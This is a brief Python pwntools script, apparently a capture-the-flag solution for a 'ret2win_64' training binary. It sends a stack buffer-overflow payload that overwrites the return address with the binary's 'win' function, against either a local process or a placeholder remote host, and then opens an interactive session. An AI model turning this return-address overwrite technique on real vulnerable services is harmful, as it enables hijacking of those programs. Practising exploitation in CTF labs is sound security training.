#!/usr/bin/env python3
from pwn import *

exe = ELF("./ret2win_64")

context.binary = exe

gdb_script = f"""
    break *main
    continue
"""

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r, gdbscript=gdb_script)
    else:
        r = remote("addr", 1337)

    return r

def main():
    r = conn()

    win = exe.symbols['win']
    payload = b'A' * 32 + b'B' * 8 + p64(win+1) + p64(0x4012f4) * 2
    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()